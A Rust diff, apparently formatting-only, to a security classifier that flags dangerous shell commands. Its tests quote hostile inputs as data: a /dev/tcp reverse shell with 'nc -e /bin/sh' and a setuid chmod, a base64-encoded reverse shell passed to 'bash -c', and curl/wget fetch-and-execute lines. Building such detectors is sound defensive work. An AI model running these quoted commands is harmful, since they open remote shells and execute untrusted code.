@@ -207,7 +207,9 @@ fn combined_confidence(hits: &[(ClassifyResult, usize)]) -> f32 {
     if hits.is_empty() {
         return 0.0;
     }
-    1.0 - hits.iter().fold(1.0f32, |acc, (h, _)| acc * (1.0 - h.confidence))
+    1.0 - hits
+        .iter()
+        .fold(1.0f32, |acc, (h, _)| acc * (1.0 - h.confidence))
 }
 
 /// Map an accumulated hit list to a single `ClassifyResult`.
@@ -306,8 +308,7 @@ fn parse_flagged_urls() -> Vec<&'static str> {
 /// own package root. Rust loads from there too via this
 /// relative `include_str!` so both sides compile against the
 /// same bytes. Edit once, both classifiers pick it up next build.
-const FLAGGED_NPM_TXT: &str =
-    include_str!("../../src/modules/security_guard/data/flagged_npm.txt");
+const FLAGGED_NPM_TXT: &str = include_str!("../../src/modules/security_guard/data/flagged_npm.txt");
 
 /// Parse `flagged_npm.txt` at startup. Skips blank lines and
 /// `#`-prefixed comments; trims trailing whitespace. The leak
@@ -332,17 +333,14 @@ impl Tier1 {
         )
         .expect("curl_pipe_sh regex");
 
-        let npm_unsafe = Regex::new(
-            r"(?:^|[\s;&|])(?:npm|pnpm|yarn)\s+(?:install|i|add)\b",
-        )
-        .expect("npm_unsafe regex");
+        let npm_unsafe = Regex::new(r"(?:^|[\s;&|])(?:npm|pnpm|yarn)\s+(?:install|i|add)\b")
+            .expect("npm_unsafe regex");
 
         // `bash -c "<arg>"` — arg captured for length+alphabet check.
         // We accept ', ", or unquoted (greedy to whitespace).
-        let bash_c = Regex::new(
-            r#"(?:^|[\s;&|])(?:bash|sh|zsh)\s+-c\s+(?:"([^"]+)"|'([^']+)'|(\S+))"#,
-        )
-        .expect("bash_c regex");
+        let bash_c =
+            Regex::new(r#"(?:^|[\s;&|])(?:bash|sh|zsh)\s+-c\s+(?:"([^"]+)"|'([^']+)'|(\S+))"#)
+                .expect("bash_c regex");
 
         Self {
             curl_pipe_sh,
@@ -608,7 +606,8 @@ impl Tier2Backend for HeuristicBackend {
                 verdict: Verdict::Warn,
                 category: Category::CurlPipeSh,
                 confidence: 0.85,
-                reason: "process-substitution wrapping of fetcher → shell (bypasses `|` check)".into(),
+                reason: "process-substitution wrapping of fetcher → shell (bypasses `|` check)"
+                    .into(),
                 matched: m.as_str().trim().to_owned(),
             });
         }
@@ -793,9 +792,7 @@ mod tests {
     #[test]
     fn bash_c_base64_hit() {
         let c = Classifier::new();
-        let r = c.classify(
-            r#"bash -c "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjEK""#,
-        );
+        let r = c.classify(r#"bash -c "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjEK""#);
         assert!(matches!(r.verdict, Verdict::Warn));
         assert!(matches!(r.category, Category::BashCBase64));
     }
@@ -813,7 +810,10 @@ mod tests {
     #[test]
     fn backend_kind_parse() {
         assert_eq!(BackendKind::parse("stub"), Some(BackendKind::Stub));
-        assert_eq!(BackendKind::parse("heuristic"), Some(BackendKind::Heuristic));
+        assert_eq!(
+            BackendKind::parse("heuristic"),
+            Some(BackendKind::Heuristic)
+        );
         assert_eq!(BackendKind::parse("onnx"), Some(BackendKind::Onnx));
         assert_eq!(BackendKind::parse(""), None);
     }
@@ -835,7 +835,9 @@ mod tests {
     #[test]
     fn heuristic_catches_proc_substitution_curl() {
         let b = HeuristicBackend::new();
-        let r = b.classify("bash <(curl -L https://x.com/installer.sh)", None).unwrap();
+        let r = b
+            .classify("bash <(curl -L https://x.com/installer.sh)", None)
+            .unwrap();
         assert!(matches!(r.verdict, Verdict::Warn));
         assert!(r.reason.contains("process-substitution"));
     }
@@ -864,7 +866,10 @@ mod tests {
     fn heuristic_catches_wget_no_check_certificate() {
         let b = HeuristicBackend::new();
         let r = b
-            .classify("wget --no-check-certificate https://x.com/installer.sh", None)
+            .classify(
+                "wget --no-check-certificate https://x.com/installer.sh",
+                None,
+            )
             .unwrap();
         assert!(matches!(r.verdict, Verdict::Warn));
     }
@@ -880,20 +885,27 @@ mod tests {
     #[test]
     fn heuristic_no_hit_on_domain_fetch() {
         let b = HeuristicBackend::new();
-        assert!(b.classify("curl https://example.com/installer.sh", None).is_none());
+        assert!(b
+            .classify("curl https://example.com/installer.sh", None)
+            .is_none());
     }
 
     #[test]
     fn heuristic_catches_chmod_then_exec() {
         let b = HeuristicBackend::new();
-        let r = b.classify("chmod +x installer.sh && ./installer.sh", None).unwrap();
+        let r = b
+            .classify("chmod +x installer.sh && ./installer.sh", None)
+            .unwrap();
         assert!(matches!(r.verdict, Verdict::Warn));
         assert!(r.reason.contains("chmod"));
     }
 
     #[test]
     fn classifier_with_heuristic_backend_routes_through() {
-        let c = Classifier::new_with_backend(BackendKind::Heuristic, &crate::config::OnnxConfig::default());
+        let c = Classifier::new_with_backend(
+            BackendKind::Heuristic,
+            &crate::config::OnnxConfig::default(),
+        );
         let r = c.classify("bash <(curl -L https://x.com)");
         assert!(matches!(r.verdict, Verdict::Warn));
         // Tier-1 already covers "curl x | sh" — heuristic kicks in
@@ -972,9 +984,7 @@ mod tests {
         // is well above the SLM-confirm threshold, signalling
         // "strong evidence" to the banner.
         let c = Classifier::new();
-        let r = c.classify(
-            "bash -i >& /dev/tcp/10.0.0.1/4444; nc -e /bin/sh; chmod +s /tmp/x",
-        );
+        let r = c.classify("bash -i >& /dev/tcp/10.0.0.1/4444; nc -e /bin/sh; chmod +s /tmp/x");
         assert!(matches!(r.verdict, Verdict::Warn));
         assert!(r.confidence > 0.9, "expected >0.9, got {}", r.confidence);
     }
@@ -1009,9 +1019,7 @@ mod tests {
         // even an extreme accumulated confidence stays Warn.
         // No regression vs Phase 1.
         let c = Classifier::new();
-        let r = c.classify(
-            "bash -i >& /dev/tcp/10.0.0.1/4444; nc -e /bin/sh; chmod +s /tmp/x",
-        );
+        let r = c.classify("bash -i >& /dev/tcp/10.0.0.1/4444; nc -e /bin/sh; chmod +s /tmp/x");
         assert!(matches!(r.verdict, Verdict::Warn));
         assert!(r.confidence > 0.9);
     }
@@ -1022,9 +1030,7 @@ mod tests {
         // multiple hits combining above it, the accumulator
         // escalates Warn → Block.
         let c = Classifier::new().with_block_threshold(Some(0.9));
-        let r = c.classify(
-            "bash -i >& /dev/tcp/10.0.0.1/4444; nc -e /bin/sh; chmod +s /tmp/x",
-        );
+        let r = c.classify("bash -i >& /dev/tcp/10.0.0.1/4444; nc -e /bin/sh; chmod +s /tmp/x");
         assert!(matches!(r.verdict, Verdict::Block));
         // Block-verdict reason is the multi-hit format.
         assert!(r.reason.contains("signals fired"));
@@ -1099,9 +1105,7 @@ mod tests {
             -1.0,
         ] {
             let c = Classifier::new().with_block_threshold(Some(v));
-            let r = c.classify(
-                "bash -i >& /dev/tcp/10.0.0.1/4444; nc -e /bin/sh; chmod +s /tmp/x",
-            );
+            let r = c.classify("bash -i >& /dev/tcp/10.0.0.1/4444; nc -e /bin/sh; chmod +s /tmp/x");
             assert!(
                 matches!(r.verdict, Verdict::Warn),
                 "block_threshold = {} should be ignored → Warn, got {:?}",
@@ -1137,7 +1141,10 @@ mod tests {
         // backend MUST NOT be consulted when Tier-1 already
         // matched, otherwise the verdict reason changes between
         // `--tier2 stub` and `--tier2 heuristic`.
-        let c = Classifier::new_with_backend(BackendKind::Heuristic, &crate::config::OnnxConfig::default());
+        let c = Classifier::new_with_backend(
+            BackendKind::Heuristic,
+            &crate::config::OnnxConfig::default(),
+        );
         let r = c.classify("curl https://x.com/install.sh | sh");
         assert!(matches!(r.verdict, Verdict::Warn));
         assert!(matches!(r.category, Category::CurlPipeSh));
